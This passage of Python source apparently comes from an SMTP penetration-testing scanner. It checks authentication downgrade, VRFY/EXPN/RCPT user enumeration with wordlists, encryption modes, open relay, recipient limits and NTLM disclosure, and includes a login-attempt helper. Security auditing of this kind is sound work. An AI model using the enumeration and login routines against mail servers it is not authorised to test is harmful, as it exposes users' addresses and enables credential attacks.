            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                return AuthDowngradeResult(
                    vulnerable=False,
                    weakness=False,
                    indeterminate=True,
                    info_defensive=False,
                    methods_before=methods_before,
                    methods_after=[],
                    auth_method_used=auth_method_used,
                    server_response=server_response,
                    detail="Connection closed during second EHLO",
                    rset_ok=True,
                )
            ehlo_after = ehlo_after_bytes.decode() if ehlo_after_bytes else ""
            methods_after = sorted(_get_auth_methods_from_ehlo(ehlo_after))

        except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
            return AuthDowngradeResult(
                vulnerable=False,
                weakness=False,
                indeterminate=True,
                info_defensive=False,
                methods_before=methods_before,
                methods_after=[],
                auth_method_used=auth_method_used or "?",
                server_response=server_response or str(e),
                detail="Connection closed during test",
                rset_ok=None,
            )

        set_before = set(m.upper() for m in methods_before)
        set_after = set(m.upper() for m in methods_after)

        new_methods = set_after - set_before
        removed_methods = set_before - set_after

        if not methods_after:
            return AuthDowngradeResult(
                vulnerable=False,
                weakness=False,
                indeterminate=False,
                info_defensive=True,
                methods_before=methods_before,
                methods_after=[],
                auth_method_used=auth_method_used,
                server_response=server_response,
                detail="AUTH disappeared after failure (defensive reaction)",
                rset_ok=True,
            )

        if new_methods:
            weak_new = new_methods & WEAK_METHODS
            detail = f"New methods after failure: {sorted(new_methods)}"
            if weak_new:
                detail += "; risk: credential sniffing"
            return AuthDowngradeResult(
                vulnerable=True,
                weakness=False,
                indeterminate=False,
                info_defensive=False,
                methods_before=methods_before,
                methods_after=methods_after,
                auth_method_used=auth_method_used,
                server_response=server_response,
                detail=detail,
                rset_ok=True,
            )

        if removed_methods and (set_after & WEAK_METHODS):
            return AuthDowngradeResult(
                vulnerable=True,
                weakness=True,
                indeterminate=False,
                info_defensive=False,
                methods_before=methods_before,
                methods_after=methods_after,
                auth_method_used=auth_method_used,
                server_response=server_response,
                detail=f"Strong methods removed, PLAIN/LOGIN remained: {sorted(removed_methods)}",
                rset_ok=True,
            )

        return AuthDowngradeResult(
            vulnerable=False,
            weakness=False,
            indeterminate=False,
            info_defensive=False,
            methods_before=methods_before,
            methods_after=methods_after,
            auth_method_used=auth_method_used,
            server_response=server_response,
            detail="No authentication downgrade detected",
            rset_ok=True,
        )

    def test_enumeration(self, smtp: smtplib.SMTP, enumeration_vulns: dict[str, bool | None]):
        if self.args.enumerate is None:
            return None

        if self.args.enumerate == "ALL":
            self.args.enumerate = ["VRFY", "EXPN", "RCPT"]

        try:
            if "EXPN" in self.args.enumerate:
                enumeration_vulns.update({"expn": self.expn_vrfy_test("EXPN", smtp)})
            if "VRFY" in self.args.enumerate:
                enumeration_vulns.update({"vrfy": self.expn_vrfy_test("VRFY", smtp)})
            if "RCPT" in self.args.enumerate:
                enumeration_vulns.update({"rcpt": self.rcpt_test(smtp)})
        except Exception as e:
            msg = (
                f"Connection terminated with server "
                f"{self.args.target.ip}:{self.args.target.port} ({get_mode(self.args)}): {e}"
            )
            self._fail(msg)

    def test_slowdown_enumeration(
        self, smtp: smtplib.SMTP, enumeration_vulns: dict[str, bool | None]
    ):
        if self.args.enumerate is None:
            return None

        self.slow_down_results = {"expn": False, "vrfy": False, "rcpt": False}
        if "EXPN" in self.args.enumerate and enumeration_vulns["expn"]:
            self.slow_down_results.update(self.expn_vrfy_slow_down_test("EXPN", smtp))
        if "VRFY" in self.args.enumerate and enumeration_vulns["vrfy"]:
            self.slow_down_results.update(self.expn_vrfy_slow_down_test("VRFY", smtp))
        if "RCPT" in self.args.enumerate and enumeration_vulns["rcpt"]:
            self.slow_down_results.update(self.rcpt_slow_down_test(smtp))

        self.ptdebug("Slow-Down results:", Out.INFO)
        for key, value in self.slow_down_results.items():
            self.ptdebug(f"{key}:{bool(value)}")

    def do_enumeration(
        self, smtp: smtplib.SMTP, enumeration_vulns: dict[str, bool]
    ) -> dict[str, list[str] | None]:
        """OWASP: skip enumeration when catch-all would make results unreliable."""
        enumeration_results: dict[str, list[str] | None] = {
            "expn": None,
            "vrfy": None,
            "rcpt": None,
        }
        catch_all = getattr(self.results, "catch_all", None)

        if enumeration_vulns["expn"]:
            if catch_all == "configured":
                self.ptdebug("Skipping EXPN enumeration: catch-all configured (results would be false positives)", Out.INFO)
            else:
                enumeration_results["expn"] = self.expn_vrfy_enumeration("EXPN", smtp)
        elif enumeration_vulns["vrfy"]:
            if catch_all == "configured":
                self.ptdebug("Skipping VRFY enumeration: catch-all configured (results would be false positives)", Out.INFO)
            else:
                enumeration_results["vrfy"] = self.expn_vrfy_enumeration("VRFY", smtp)
        elif enumeration_vulns["rcpt"]:
            if catch_all in ("indeterminate", "configured"):
                self.ptdebug(
                    f"Skipping RCPT enumeration: catch-all {catch_all} (results would be false positives)",
                    Out.INFO,
                )
            else:
                enumeration_results["rcpt"] = self.rcpt_enumeration(smtp)

        return enumeration_results

    def enumeration(self, smtp: smtplib.SMTP) -> list[EnumResult]:
        enumeration_vulns: dict[str, bool | None] = {
            "expn": None,
            "vrfy": None,
            "rcpt": None,
        }
        enumeration_results = None
        self._enum_blocked_by_rbl = set()

        self.test_enumeration(smtp, enumeration_vulns)

        if self.args.slow_down:
            self.test_slowdown_enumeration(smtp, enumeration_vulns)

        if self.wordlist is not None:
            enumeration_results = self.do_enumeration(smtp, enumeration_vulns)

        enum_results: list[EnumResult] = []

        for method in enumeration_vulns.keys():
            if (vulnerable := enumeration_vulns[method]) is not None:
                if self.args.slow_down:
                    slow_down = self.slow_down_results[method]
                else:
                    slow_down = None

                if self.wordlist is not None:
                    wordlist_result = enumeration_results[method]
                else:
                    wordlist_result = None

                test_replies = getattr(self, "_enum_test_replies", {})
                server_reply = test_replies.get(method)
                blocked_by_rbl = method in getattr(self, "_enum_blocked_by_rbl", set())
                enum_results.append(
                    EnumResult(method, vulnerable, slow_down, wordlist_result, server_reply, blocked_by_rbl)
                )

        return enum_results

    def initial_info(self, get_commands: bool = True) -> tuple[smtplib.SMTP, InfoResult]:
        """Connect and get banner; optionally get EHLO (commands). If PLAIN advertises STARTTLS,
        open a new connection to get EHLO after STARTTLS (keeps main connection plain for other tests)."""
        self.ptdebug("Initial server information", title=True)

        smtp, status, reply = self.connect()
        if status != 220:
            msg = f"SMTP Info - [{status}] {self.bytes_to_str(reply)}"
            if self.use_json:
                self.ptjsonlib.end_error(msg, self.use_json)
            raise Exception(msg)
        banner = reply.decode()
        self.ptdebug("Banner: " + banner, Out.INFO)

        ehlo = None
        ehlo_starttls = None
        if get_commands:
            try:
                _, ehlo_bytes = smtp.ehlo(self.fqdn)
                ehlo = ehlo_bytes.decode()
                self.ptdebug("EHLO response: " + ehlo, Out.INFO)
            except Exception as e:
                msg = (
                    f"Could not negotiate initial EHLO with "
                    f"{self.args.target.ip}:{self.args.target.port} ({get_mode(self.args)}): {e}"
                )
                self._fail(msg)

            # If on plain connection and server advertises STARTTLS, get EHLO after STARTTLS
            # via a new connection (same manual STARTTLS as test_encryption: no SNI when IP).
            if (
                ehlo
                and "STARTTLS" in ehlo.upper()
                and self.args.target.port != 465
                and not self.args.tls
            ):
                smtp_stls = None
                try:
                    _ssl_ctx = ssl._create_unverified_context()
                    smtp_stls = smtplib.SMTP(timeout=15.0)
                    status, _ = smtp_stls.connect(self.args.target.ip, self.args.target.port)
                    if status != 220:
                        raise Exception("connect failed")
                    status, _ = smtp_stls.docmd("EHLO", self.fqdn)
                    if status != 250:
                        raise Exception("EHLO failed")
                    status, _ = smtp_stls.docmd("STARTTLS")
                    if status != 220:
                        raise Exception("STARTTLS refused")
                    try:
                        _is_ip = ipaddress.ip_address(self.args.target.ip)
                        _sni = None
                    except ValueError:
                        _sni = self.args.target.ip
                    sock_ssl = _ssl_ctx.wrap_socket(smtp_stls.sock, server_hostname=_sni)
                    smtp_stls.sock = sock_ssl
                    smtp_stls.file = None
                    smtp_stls.helo_resp = None
                    smtp_stls.ehlo_resp = None
                    smtp_stls.esmtp_features = {}
                    smtp_stls.does_esmtp = False
                    status, ehlo_st_bytes = smtp_stls.docmd("EHLO", self.fqdn)
                    if status == 250:
                        ehlo_starttls = ehlo_st_bytes.decode()
                        self.ptdebug("EHLO after STARTTLS: " + ehlo_starttls, Out.INFO)
                except Exception as e:
                    self.ptdebug(f"STARTTLS EHLO failed: {e}", Out.INFO)
                finally:
                    if smtp_stls is not None:
                        try:
                            smtp_stls.close()
                        except Exception:
                            pass

        return smtp, InfoResult(banner, ehlo, ehlo_starttls)

    def test_encryption(self) -> EncryptionResult:
        """
        Test which encryption options are available on the target port:
        plaintext, STARTTLS, and implicit TLS (SMTP_SSL).
        Uses fresh connections for each test; does not use self.args.tls/starttls.

        The caller (run() or _run_all_tests()) stores the return value in
        self.results.encryption so that subsequent tests can use it to select
        the appropriate connection type (e.g. prefer STARTTLS when available).
        """
        host = self.args.target.ip
        port = self.args.target.port
        timeout = 10.0
        plaintext_ok = False
        starttls_ok = False
        tls_ok = False

        # Unverified context for availability probe only (server cert may be
        # self-signed or for different hostname). Use _create_unverified_context
        # for maximum compatibility with real-world servers.
        _ssl_ctx = ssl._create_unverified_context()
        # Port 465 is implicit TLS only (SMTPS): skip plaintext and STARTTLS (they would hang/timeout).
        tls_only_port = port == 465

        if not tls_only_port:
            # 1. STARTTLS (plain then upgrade). RFC 3207: EHLO first, then STARTTLS, then EHLO.
            try:
                smtp = smtplib.SMTP(timeout=timeout)
                try:
                    status, _ = smtp.connect(host, port)
                    if status == 220:
                        status, _ = smtp.docmd("EHLO", self.fqdn)
                        if status == 250:
                            status, _ = smtp.docmd("STARTTLS")
                            if status == 220:
                                try:
                                    _is_ip = ipaddress.ip_address(host)
                                    _sni = None
                                except ValueError:
                                    _sni = host
                                sock_ssl = _ssl_ctx.wrap_socket(
                                    smtp.sock, server_hostname=_sni
                                )
                                smtp.sock = sock_ssl
                                smtp.file = None
                                smtp.helo_resp = None
                                smtp.ehlo_resp = None
                                smtp.esmtp_features = {}
                                smtp.does_esmtp = False
                                status, _ = smtp.docmd("EHLO", self.fqdn)
                                starttls_ok = status == 250
                finally:
                    smtp.close()
            except Exception as e:
                self.ptdebug(f"STARTTLS test failed: {e}", Out.INFO)

            time.sleep(2)

            # 2. Plaintext (no TLS)
            try:
                smtp = smtplib.SMTP(timeout=timeout)
                try:
                    status, _ = smtp.connect(host, port)
                    if status == 220:
                        status, _ = smtp.docmd("EHLO", self.fqdn)
                        plaintext_ok = status == 250
                finally:
                    smtp.close()
            except Exception:
                pass

            time.sleep(2)

        # 3. Implicit TLS (port 465 / SMTPS). Connect manually so we control SNI:
        # when connecting by IP use server_hostname=None (many servers have hostname-only certs).
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            try:
                try:
                    ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                smtp = smtplib.SMTP(timeout=timeout)
                try:
                    smtp.sock = sock_ssl
                    smtp.file = None
                    (status, _) = smtp.getreply()
                    if status == 220:
                        status, _ = smtp.docmd("EHLO", self.fqdn)
                        tls_ok = status == 250
                finally:
                    smtp.close()
            finally:
                try:
                    sock_ssl.close()
                except Exception:
                    pass
        except Exception:
            pass

        return EncryptionResult(plaintext_ok, starttls_ok, tls_ok)

    def _try_login(self, creds: Creds) -> Creds | None:
        smtp, *_ = self.connect()

        try:
            smtp.login(creds.user, creds.passw)
            result = creds
        except:
            result = None
        finally:
            smtp.close()
            return result

    # endregion

    # region streaming (real-time terminal output during run)

    def _get_domain_from_banner_or_ptr(self, info: InfoResult | None) -> str | None:
        """Extract hostname from banner/EHLO or PTR lookup. Returns None on failure."""
        if info:
            # From banner (220 hostname or tokens)
            if info.banner:
                # First: extract domain from angle brackets (e.g. <xxx@domain>)
                for match in re.finditer(r"<[^>]*@([^>]+)>", info.banner):
                    domain = match.group(1).strip().rstrip(".")
                    if _is_valid_hostname(domain):
                        return domain
                # Fallback: space-separated tokens (skip tokens ending with "." like "ready.")
                for token in info.banner.replace(",", " ").replace("(", " ").replace(")", " ").split():
                    token = token.strip().rstrip(".")
                    if token and _is_valid_hostname(token):
                        return token
            # From EHLO first line (250 hostname)
            if info.ehlo:
                for line in (info.ehlo or "").replace("\r\n", "\n").split("\n"):
                    line = line.strip()
                    if line.startswith("250-") or line.startswith("250 "):
                        rest = line[4:].strip() if line.startswith("250-") else line[3:].strip()
                        if rest:
                            first = rest.split()[0]
                            if _is_valid_hostname(first):
                                return first
        try:
            ptr_host = socket.gethostbyaddr(self.target_ip)[0]
            if ptr_host and _is_valid_hostname(ptr_host):
                return ptr_host
        except (socket.herror, socket.gaierror, socket.timeout, OSError):
            pass
        return None

    def _stream_ptr_domain(self) -> None:
        """Stream PTR / resolved domain (like POP3/IMAP/FTP/SSH)."""
        if self.use_json or not (domain := getattr(self.results, "resolved_domain", None)):
            return
        self.ptprint("PTR / Domain", Out.INFO)
        icon = get_colored_text("[*]", color="INFO")
        self.ptprint(f"    {icon} Resolved domain: {domain}", Out.TEXT)
        self._streamed_ptr_domain = True

    def _stream_banner_result(self) -> None:
        """Print banner result to terminal (header already printed before initial_info())."""
        if not self.results.banner_requested:
            return
        if not (info := self.results.info) or info.banner is None:
            self.ptprint("Service Identification", Out.INFO)
            info_icon = get_colored_text("[*]", color="INFO")
            self.ptprint(f"    {info_icon} No information found", Out.TEXT)
            return
        sid = identify_service(info.banner)
        if sid is None:
            icon = get_colored_text("[✓]", color="NOTVULN")
        elif sid.version is not None:
            icon = get_colored_text("[✗]", color="VULN")
        else:
            icon = get_colored_text("[!]", color="WARNING")
        self.ptprint(f"    {icon} {info.banner}", Out.TEXT)
        if sid is None:
            self.ptprint("Service Identification", Out.INFO)
            info_icon = get_colored_text("[*]", color="INFO")
            self.ptprint(f"    {info_icon} No information found", Out.TEXT)
        elif sid is not None:
            self.ptprint("Service Identification", Out.INFO)
            self.ptprint(f"    Product:  {sid.product}", Out.TEXT)
            self.ptprint(f"    Version:  {sid.version if sid.version else 'unknown'}", Out.TEXT)
            self.ptprint(f"    CPE:      {sid.cpe}", Out.TEXT)

    def _stream_ehlo_result(self) -> None:
        """Print EHLO section header(s) and result."""
        if not self.results.commands_requested or not (info := self.results.info) or info.ehlo is None:
            return
        ehlo_starttls = getattr(info, "ehlo_starttls", None)

        def _print_ehlo_parsed(ehlo_raw: str, connection_encrypted: bool) -> None:
            parsed = _parse_ehlo_commands(ehlo_raw, connection_encrypted=connection_encrypted)
            for display_str, level in parsed:
                if level == "ERROR":
                    icon = get_colored_text("[✗]", color="VULN")
                elif level == "WARNING":
                    icon = get_colored_text("[!]", color="WARNING")
                else:
                    icon = get_colored_text("[✓]", color="NOTVULN")
                self.ptprint(f"    {icon} {display_str}", Out.TEXT)

        if ehlo_starttls:
            self.ptprint("EHLO extensions (PLAIN)", Out.INFO)
            if info.ehlo:
                _print_ehlo_parsed(info.ehlo, connection_encrypted=False)
            self.ptprint("EHLO extensions (STARTTLS)", Out.INFO)
            _print_ehlo_parsed(ehlo_starttls, connection_encrypted=True)
        else:
            connection_encrypted = (
                self.args.target.port == 465 or self.args.tls or self.args.starttls
            )
            section_label = " (TLS)" if connection_encrypted else " (PLAIN)"
            self.ptprint(f"EHLO extensions{section_label}", Out.INFO)
            if info.ehlo:
                _print_ehlo_parsed(info.ehlo, connection_encrypted=connection_encrypted)
            if (
                not connection_encrypted
                and "STARTTLS" in (info.ehlo or "").upper()
                and not getattr(info, "ehlo_starttls", None)
            ):
                self.ptprint("EHLO extensions (STARTTLS)", Out.INFO)
                icon = get_colored_text("[*]", color="INFO")
                self.ptprint(
                    f"    {icon} Failed to establish STARTTLS connection or STARTTLS command is not available in EHLO (try -vv for debug)",
                    Out.TEXT,
                )

    def _stream_role_result(self) -> None:
        """Print role identification result."""
        if (role_error := self.results.role_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Role identification failed: {role_error}", Out.TEXT)
            return
        role_r = self.results.role
        if role_r is None:
            return

        info_icon = get_colored_text("[*]", color="INFO")
        port = self.args.target.port

        # Port hint line
        port_labels = {
            25: "typical MTA port",
            587: "typical Submission port (STARTTLS)",
            465: "typical Submission port (implicit TLS)",
            2525: "alternative Submission port",
        }
        port_label = port_labels.get(port, f"non-standard SMTP port")
        self.ptprint(f"    {info_icon} Port {port} ({port_label})", Out.TEXT)

        # AUTH line
        if role_r.auth_advertised:
            _, methods_plain = self._ehlo_has_auth(
                self.results.info.ehlo if self.results.info else None
            )
            _, methods_starttls = self._ehlo_has_auth(
                getattr(self.results.info, "ehlo_starttls", None) if self.results.info else None
            )
            methods = sorted(set(methods_plain + methods_starttls))
            methods_str = ", ".join(methods) if methods else "unknown"
            self.ptprint(f"    {info_icon} AUTH advertised in EHLO ({methods_str})", Out.TEXT)
        else:
            self.ptprint(f"    {info_icon} AUTH not advertised in EHLO", Out.TEXT)

        # RCPT TO probe result line (if probe was performed)
        if role_r.auth_required is True:
            self.ptprint(f"    {info_icon} RCPT TO requires authentication", Out.TEXT)
        elif role_r.auth_required is False:
            self.ptprint(f"    {info_icon} RCPT TO accepted without authentication", Out.TEXT)

        # Greylisting detection (450/451 = server has active anti-spam sender reputation checks)
        if "greylisting detected" in role_r.detail.lower():
            self.ptprint(f"    {info_icon} Greylisting detected (server returned 450/451)", Out.TEXT)

        # Final role line
        role_display = {
            "mta": ("MTA (Public Mail Server)", "[✓]", "NOTVULN"),
            "submission": ("Submission (Mail Submission Agent)", "[✓]", "NOTVULN"),
            "hybrid": ("Hybrid (MTA + Submission) -- consider separating roles", "[✗]", "VULN"),
            "indeterminate": ("Indeterminate -- could not reliably determine role", "[✗]", "VULN"),
        }
        label, icon_text, color = role_display.get(
            role_r.role, ("Unknown", "[✗]", "VULN")
        )
        icon = get_colored_text(icon_text, color=color)
        self.ptprint(f"    {icon} {label}", Out.TEXT)

    def _stream_encryption_result(self) -> None:
        if (encryption_error := self.results.encryption_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Encryption test failed: {encryption_error}", Out.TEXT)
            return
        enc = self.results.encryption
        if enc is None:
            return
        plaintext_only = enc.plaintext_ok and not enc.starttls_ok and not enc.tls_ok
        any_ok = enc.plaintext_ok or enc.starttls_ok or enc.tls_ok
        if plaintext_only:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Plaintext only", Out.TEXT)
        elif any_ok:
            if enc.plaintext_ok:
                # Plaintext available together with STARTTLS/TLS = warning
                icon = (
                    get_colored_text("[!]", color="WARNING")
                    if (enc.starttls_ok or enc.tls_ok)
                    else get_colored_text("[✓]", color="NOTVULN")
                )
                self.ptprint(f"    {icon} Plaintext", Out.TEXT)
            if enc.starttls_ok:
                icon = get_colored_text("[✓]", color="NOTVULN")
                self.ptprint(f"    {icon} STARTTLS", Out.TEXT)
            if enc.tls_ok:
                icon = get_colored_text("[✓]", color="NOTVULN")
                self.ptprint(f"    {icon} TLS", Out.TEXT)
        else:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(
                f"    {icon} No connection mode available (plaintext, STARTTLS, TLS failed)",
                Out.TEXT,
            )

    def _stream_open_relay_result(self) -> None:
        if (open_relay_error := self.results.open_relay_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Open relay test failed: {open_relay_error}", Out.TEXT)
            return
        if (open_relay := self.results.open_relay) is None:
            return
        if open_relay:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Open relay is allowed", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} Open relay is denied", Out.TEXT)

    def _stream_rcpt_limit_result(self) -> None:
        rcptmax_advertised = None
        if (info := getattr(self.results, "info", None)) and getattr(info, "ehlo", None):
            rcptmax_advertised = _parse_rcptmax_from_ehlo(info.ehlo)
        if (rcpt_limit_err := self.results.rcpt_limit_error) is not None:
            if rcptmax_advertised is not None:
                info_icon = get_colored_text("[*]", color="INFO")
                self.ptprint(
                    f"    {info_icon} Advertised in EHLO (RFC 9422): RCPTMAX={rcptmax_advertised}",
                    Out.TEXT,
                )
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Test failed: {rcpt_limit_err}", Out.TEXT)
            return
        rlim = self.results.rcpt_limit
        if rlim is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        if rcptmax_advertised is not None:
            self.ptprint(
                f"    {info_icon} Advertised in EHLO (RFC 9422): RCPTMAX={rcptmax_advertised}",
                Out.TEXT,
            )
        if getattr(rlim, "rejected_addresses", False):
            attempts = getattr(rlim, "failed_before_limit", 0)
            attempts_suffix = f" (after {attempts} attempts)" if attempts else ""
            self.ptprint(
                f"    {info_icon} Could not test per-message limit: server rejects test addresses{attempts_suffix}",
                Out.TEXT,
            )
            if rlim.server_response:
                for line in (rlim.server_response or "").replace("\r", "").splitlines():
                    self.ptprint(f"        {line}", Out.TEXT)
            if getattr(rlim, "no_session_limit", False):
                vuln_icon = get_colored_text("[✗]", color="VULN")
                failed = getattr(rlim, "failed_before_limit", 0)
                self.ptprint(
                    f"    {vuln_icon} Server does not limit failed RCPT attempts per session "
                    f"(allowed {failed} attempts without disconnect – no smtpd_hard_error_limit)",
                    Out.TEXT,
                )
            if not getattr(self.args, "domain", None):
                self.ptprint(
                    f"    {info_icon} Try -d/--domain <domain> to set recipient domain for this test",
                    Out.TEXT,
                )
        elif getattr(rlim, "session_limit_triggered", False):
            icon = get_colored_text("[✓]", color="NOTVULN")
            attempts = getattr(rlim, "failed_before_limit", 0)
            attempts_suffix = f" (after {attempts} attempts)" if attempts else ""
            self.ptprint(
                f"    {icon} Session limit enforced (421 or disconnect){attempts_suffix}",
                Out.TEXT,
            )
            if rlim.server_response:
                for line in (rlim.server_response or "").replace("\r", "").splitlines():
                    self.ptprint(f"        {line}", Out.TEXT)
        elif rlim.limit_triggered:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} Per-message limit enforced after {rlim.max_accepted} recipients", Out.TEXT)
            if rlim.server_response:
                for line in (rlim.server_response or "").replace("\r", "").splitlines():
                    self.ptprint(f"        {line}", Out.TEXT)
        else:
            if rlim.max_accepted == 0:
                self.ptprint(f"    {info_icon} Could not test: no recipients accepted", Out.TEXT)
                if rlim.server_response:
                    for line in (rlim.server_response or "").replace("\r", "").splitlines():
                        self.ptprint(f"        {line}", Out.TEXT)
            else:
                icon = get_colored_text("[✗]", color="VULN")
                self.ptprint(
                    f"    {icon} No limit or too high: {rlim.max_accepted} recipients accepted",
                    Out.TEXT,
                )

    def _stream_blacklist_result(self) -> None:
        if (blacklist_error := self.results.blacklist_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Blacklist test failed: {blacklist_error}", Out.TEXT)
            return
        if self.results.blacklist_private_ip_skipped:
            info_icon = get_colored_text("[*]", color="INFO")
            self.ptprint(
                f"    {info_icon}Private/internal IP - blacklist check not applicable (addresses in private ranges are not listed on public blacklists)",
                Out.TEXT,
            )
            return
        blacklist = self.results.blacklist
        if blacklist is None:
            return
        if not blacklist.listed:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} Clean", Out.TEXT)
        else:
            icon = get_colored_text("[✗]", color="VULN")
            if (results := blacklist.results) is not None:
                for r in results:
                    r_str = f'{r.blacklist.strip()}: "{r.reason}" (TTL={r.ttl})'
                    self.ptprint(f"    {icon} {r_str}", Out.TEXT)

    def _stream_spf_result(self) -> None:
        if self.results.spf_requires_domain:
            info_icon = get_colored_text("[*]", color="INFO")
            self.ptprint(
                f"    {info_icon} Test requires target specified by a domain name",
                Out.TEXT,
            )
            return
        if (spf_error := self.results.spf_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} SPF test failed: {spf_error}", Out.TEXT)
            return
        spf_records = self.results.spf_records
        if spf_records is None:
            return
        for ns, records in spf_records.items():
            info_icon = get_colored_text("[*]", color="INFO")
            self.ptprint(f"    {info_icon} Nameserver {ns}", Out.TEXT)
            for r in records:
                self.ptprint(f"        {r}", Out.TEXT)

    def _stream_enumeration_result(self) -> None:
        if (enum_error := self.results.enum_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Enumeration test failed: {enum_error}", Out.TEXT)
            return
        enum_results = self.results.enum_results
        if enum_results is None:
            return
        catch_all = getattr(self.results, "catch_all", None)
        if self.args.enumerate is None:
            requested_set = {"EXPN", "VRFY", "RCPT"}
        elif isinstance(self.args.enumerate, list):
            requested_set = {m.upper() for m in self.args.enumerate if m}
        else:
            requested_set = {self.args.enumerate.upper()} if self.args.enumerate else {"EXPN", "VRFY", "RCPT"}
        filtered = [e for e in enum_results if e.method.upper() in requested_set]
        warn_icon = get_colored_text("[!]", color="WARNING")
        for e in filtered:
            if catch_all == "configured":
                self.ptprint(
                    f"    {warn_icon} {e.method.upper()} method: Indeterminate (Useless due to Catch All)",
                    Out.TEXT,
                )
            elif e.blocked_by_rbl:
                icon = get_colored_text("[✓]", color="NOTVULN")
                self.ptprint(
                    f"    {icon} {e.method.upper()} method protected by RBL/Reputation (Client IP blocked)",
                    Out.TEXT,
                )
                if e.server_reply:
                    for line in (e.server_reply or "").replace("\r", "").splitlines():
                        self.ptprint(f"        {line.strip()}", Out.TEXT)
            else:
                slowdown = ""
                if e.slowdown is not None:
                    slowdown = " (rate limited)" if e.slowdown else " (not rate limited)"
                icon = get_colored_text("[✗]", color="VULN") if e.vulnerable else get_colored_text("[✓]", color="NOTVULN")
                if e.vulnerable:
                    if e.server_reply:
                        raw = (e.server_reply or "").replace("\r", "").splitlines()
                        parts = [re.sub(r" +", " ", p.strip()) for p in raw if p.strip()]
                        if parts:
                            if len(parts) == 1:
                                self.ptprint(f"    {icon} {e.method.upper()} method is enabled ({parts[0]}){slowdown}", Out.TEXT)
                            else:
                                self.ptprint(
                                    f"    {icon} {e.method.upper()} method is enabled ({parts[0]}{')' if len(parts) == 1 else ''}{slowdown if len(parts) == 1 else ''}",
                                    Out.TEXT,
                                )
                                for i, part in enumerate(parts[1:]):
                                    is_last = i == len(parts) - 2
                                    self.ptprint(f"        {part}{')' if is_last else ''}{slowdown if is_last else ''}", Out.TEXT)
                        else:
                            self.ptprint(f"    {icon} {e.method.upper()} method is enabled{slowdown}", Out.TEXT)
                    else:
                        self.ptprint(f"    {icon} {e.method.upper()} method is enabled{slowdown}", Out.TEXT)
                else:
                    # Show policy note when available (relay protection / admin prohibition)
                    if e.server_reply and "Relay protection active" in e.server_reply:
                        status = "is deny (Relay protection active)"
                    elif e.server_reply and "Administrative prohibition" in e.server_reply:
                        status = "is deny (Administrative prohibition)"
                    else:
                        status = "is deny"
                    self.ptprint(f"    {icon} {e.method.upper()} method {status}{slowdown}", Out.TEXT)
        for e in filtered:
            if e.vulnerable and (results := e.results) is not None:
                sorted_results = sorted(results, key=str)
                email_count = sum(1 for r in sorted_results if "@" in str(r))
                self.ptprint(f"Enumerated {email_count} users", Out.INFO)
                for r in sorted_results:
                    self.ptprint(f"    {r}")
        info_icon = get_colored_text("[*]", color="INFO")
        if catch_all == "configured":
            self.ptprint(f"    {info_icon} Catch All mailbox configured", Out.TEXT)
        elif catch_all == "not_configured":
            self.ptprint(f"    {info_icon} Catch All mailbox not configured", Out.TEXT)
        elif catch_all == "indeterminate":
            self.ptprint(f"    {info_icon} Catch All mailbox indeterminate", Out.TEXT)

    def _stream_ntlm_result(self) -> None:
        if (ntlm_error := self.results.ntlm_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} NTLM test failed: {ntlm_error}", Out.TEXT)
            return
        ntlm = self.results.ntlm
        if ntlm is None:
            return
        if not ntlm.success:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} Not available", Out.TEXT)
        elif ntlm.ntlm is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} NTLM information", Out.TEXT)
            for line in (
                f"Target name: {ntlm.ntlm.target_name}",
                f"NetBios domain name: {ntlm.ntlm.netbios_domain}",
                f"NetBios computer name: {ntlm.ntlm.netbios_computer}",
                f"DNS domain name: {ntlm.ntlm.dns_domain}",
                f"DNS computer name: {ntlm.ntlm.dns_computer}",
                f"DNS tree: {ntlm.ntlm.dns_tree}",
                f"OS version: {ntlm.ntlm.os_version}",
            ):
                for part in (line or "").replace("\r", "").splitlines():
                    self.ptprint(f"        {part}", Out.TEXT)

    def _stream_auth_enum_result(self) -> None:
        if (auth_enum_error := self.results.auth_enum_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} AUTH enumeration test failed: {auth_enum_error}", Out.TEXT)
            return
        ae = self.results.auth_enum
        if ae is None:
            return
        if ae.indeterminate:
            icon = get_colored_text("[*]", color="INFO")
            self.ptprint(f"    {icon} Indeterminate: {ae.detail or 'Could not determine'}", Out.TEXT)
            return
        if ae.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(
                f"    {icon} Server allows user enumeration via AUTH without password knowledge",
                Out.TEXT,
            )
            if ae.enumerated_users:
                info_icon = get_colored_text("[*]", color="INFO")
                self.ptprint(f"    {info_icon} Enumerated users", Out.TEXT)
                for u in ae.enumerated_users:
                    self.ptprint(f"        {u}", Out.TEXT)
            if ae.detail:
                self.ptprint(f"        {ae.detail}", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(
                f"    {icon} Server does not allow user enumeration via AUTH, or no valid/differentiated user in -u / -w",
                Out.TEXT,
            )

    def _stream_auth_format_result(self) -> None:
